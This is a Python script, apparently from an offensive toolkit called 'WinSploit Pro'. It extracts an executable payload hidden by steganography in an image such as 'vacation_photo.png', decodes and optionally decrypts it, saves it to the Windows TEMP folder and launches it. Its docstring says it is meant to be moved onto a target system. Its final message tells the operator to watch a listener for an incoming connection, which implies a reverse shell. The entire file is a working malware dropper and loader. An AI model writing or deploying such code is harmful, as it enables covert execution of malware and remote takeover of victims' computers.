#!/usr/bin/env python3
"""
Windows-compatible payload extractor for steganographic images
This script should be transferred to the target Windows system along with the steganographic image
"""

import os
import sys
import base64
import subprocess
from PIL import Image
from stegano import lsb

def extract_and_execute_windows(image_path, password=None):
    """Extract and execute payload on Windows system"""
    try:
        print(f"[*] Processing image: {image_path}")
        
        if not os.path.exists(image_path):
            print(f"[!] Error: Image file not found: {image_path}")
            return False
        
        # Extract hidden data
        print("[*] Extracting hidden data...")
        hidden_data = lsb.reveal(image_path)
        
        if not hidden_data:
            print("[!] No hidden data found in image")
            return False
        
        # Check for WinSploit payload marker
        if not hidden_data.startswith("WINSPLOIT_PAYLOAD:"):
            print("[!] No WinSploit payload found in image")
            return False
        
        print("[+] WinSploit payload detected!")
        
        # Parse metadata
        parts = hidden_data.split(':', 3)
        if len(parts) < 4:
            print("[!] Invalid payload format")
            return False
        
        payload_name = parts[1]
        payload_size = int(parts[2])
        encoded_data = parts[3]
        
        print(f"[*] Original filename: {payload_name}")
        print(f"[*] Payload size: {payload_size} bytes")
        
        # Decode base64 data
        print("[*] Decoding payload data...")
        decoded_data = base64.b64decode(encoded_data.encode('utf-8'))
        
        # Check if data is encrypted
        if decoded_data.startswith(b'|ENCRYPTED|'):
            if not password:
                print("[!] Payload is encrypted but no password provided")
                return False
            
            print("[*] Decrypting payload...")
            # Import here to avoid issues if cryptography not available
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            
            # Extract salt and encrypted data
            encrypted_part = decoded_data[12:]  # Remove |ENCRYPTED| marker
            salt = encrypted_part[:16]
            encrypted_payload = encrypted_part[16:]
            
            # Generate key from password
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            fernet = Fernet(key)
            
            # Decrypt payload
            payload_data = fernet.decrypt(encrypted_payload)
            print("[+] Payload decrypted successfully!")
            
        elif decoded_data.startswith(b'|PLAIN|'):
            payload_data = decoded_data[7:]  # Remove |PLAIN| marker
            print("[*] Payload is not encrypted")
        else:
            print("[!] Invalid payload format")
            return False
        
        # Verify payload size
        if len(payload_data) != payload_size:
            print(f"[!] Payload size mismatch - expected {payload_size}, got {len(payload_data)}")
            return False
        
        # Save extracted payload to temp directory
        temp_dir = os.environ.get('TEMP', '.')
        output_path = os.path.join(temp_dir, payload_name)
        
        print(f"[*] Saving payload to: {output_path}")
        with open(output_path, 'wb') as f:
            f.write(payload_data)
        
        print("[+] Payload extracted successfully!")
        
        # Execute payload
        print("[*] Executing payload...")
        try:
            # Use different methods for Windows
            if os.name == 'nt':
                # Method 1: Direct execution
                subprocess.Popen(output_path, shell=False)
                print("[+] Payload executed!")
            else:
                # Fallback for other systems
                os.chmod(output_path, 0o755)
                subprocess.Popen(f"./{output_path}", shell=True)
                print("[+] Payload executed!")
            
            return True
            
        except Exception as e:
            print(f"[!] Execution error: {e}")
            print(f"[*] Payload saved to: {output_path}")
            print("[*] You may need to run it manually")
            return False
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def main():
    print("=" * 60)
    print("WinSploit Pro - Windows Payload Extractor")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("Usage: python windows_extractor.py <image_file> [password]")
        print("Example: python windows_extractor.py vacation_photo.png")
        print("Example: python windows_extractor.py vacation_photo.png mypassword")
        sys.exit(1)
    
    image_path = sys.argv[1]
    password = sys.argv[2] if len(sys.argv) > 2 else None
    
    if password:
        print(f"[*] Using password for decryption")
    
    success = extract_and_execute_windows(image_path, password)
    
    if success:
        print("\n[+] SUCCESS: Payload extracted and executed!")
        print("[*] Check your listener for incoming connection...")
    else:
        print("\n[!] FAILED: Could not extract or execute payload")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
